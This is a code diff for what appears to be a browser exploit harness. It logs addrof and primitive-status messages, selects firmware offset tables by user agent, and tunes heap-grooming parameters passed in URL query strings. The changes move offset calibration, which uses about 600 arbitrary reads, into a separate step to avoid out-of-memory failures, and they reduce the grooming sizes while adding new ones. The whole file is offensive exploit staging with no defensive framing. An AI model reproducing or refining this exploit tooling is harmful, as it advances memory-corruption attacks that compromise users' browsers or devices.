@@ -16,7 +16,7 @@ let calibratedOff = null;
 let probeCache = null;
 let logQuiet = 0;
 
-const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-STORED/i;
+const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-STORED|TRIM-DEBRIS/i;
 const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|ABORT|PASS|GIVE-UP|PRIMITIVE|ADDROF-FAIL|ADDROF-NO/i;
 
 const LOG_MAX = 400;
@@ -485,7 +485,7 @@ function logBootInfo() {
     const detected = offsetsFor(navigator.userAgent);
     mark("UA", navigator.userAgent);
     mark("UA-FW", detected.key || "unknown");
-    mark("BOOT", "addrof needs 12M slots — if OOM use ?g=drain:256 (not lower slots)");
+    mark("BOOT", "addrof needs 12M slots — OOM? low-mem btn (never reduce slots)");
     if (params.has("g"))
         mark("BOOT", "groom override: " + params.getAll("g").join(", "));
 }
@@ -560,25 +560,12 @@ async function runEstablish() {
 
     const offKey = resolvedOffKey();
     const { off } = offsetsForKey(offKey);
-    if (off && !calibratedOff) {
-        logQuiet++;
-        try {
-            calibrateLiteSync(p, off);
-        } finally {
-            logQuiet--;
-        }
-    } else if (calibratedOff) {
-        mark("CAL-SKIP", "using ?expm1= or restored offsets");
-    }
 
     saveSession();
-    if (calibratedOff) {
-        state("primitive + cal OK — run step 2 verify", "ok");
-        mark("READY", "aligned scan inline (~600 read4, no dump needed)");
-    } else {
-        state("primitive OK — cal failed, retry step 3 or paste CAL-NATIVEFN", "warn");
-        mark("READY", "retry cal (step 3) or ?expm1=0x... if known");
-    }
+    state("primitive OK — run step 3 calibrate, then step 2 verify", "ok");
+    mark("READY", "cal is step 3 (kept out of step 1 to avoid OOM)");
+    if (off)
+        mark("HINT", "after step 1 succeeds: step 3 calibrate (~600 read4), then step 2");
 }
 
 async function runOffsetTests() {
@@ -654,7 +641,7 @@ async function runCalibrate() {
     const { off } = offsetsForKey(offKey);
     if (!off) throw new Error("no offset table for fw=" + offKey);
 
-    mark("STEP", "3 - retry calibrate");
+    mark("STEP", "3 - calibrate");
     state("calibrating...", "warn");
 
     const live = await calibrateOffsets(p, off);
@@ -771,9 +758,14 @@ function init() {
         url.searchParams.set("clear", "1");
         url.searchParams.delete("slots");
         url.searchParams.delete("g");
-        url.searchParams.append("g", "drain:192");
-        url.searchParams.append("g", "drainsz:32768");
-        url.searchParams.append("g", "slab:2097152");
+        url.searchParams.append("g", "drain:96");
+        url.searchParams.append("g", "drainsz:16384");
+        url.searchParams.append("g", "slab:524288");
+        url.searchParams.append("g", "bfly:32768");
+        url.searchParams.append("g", "early:24576");
+        url.searchParams.append("g", "guard:32768");
+        url.searchParams.append("g", "pred:32768");
+        url.searchParams.append("g", "final:32768");
         location.href = url.toString();
     });
 
@@ -817,7 +809,7 @@ function init() {
             if (tail)
                 mark("LAST-LOG", tail);
             if (savedPrimitive && !window.p)
-                mark("HINT-RESTORE", "step 1 worked last time — re-run 1 (includes nano-cal)");
+                mark("HINT-RESTORE", "step 1 worked last time — re-run 1, then 3 cal, then 2");
             else if (passCount >= 2 && !savedPrimitive)
                 mark("HINT-RESTORE", "pass=2 but primitive not saved — OOM during step 1 checks?");
             state("restored log — scroll up for crash point", savedPrimitive ? "warn" : "");
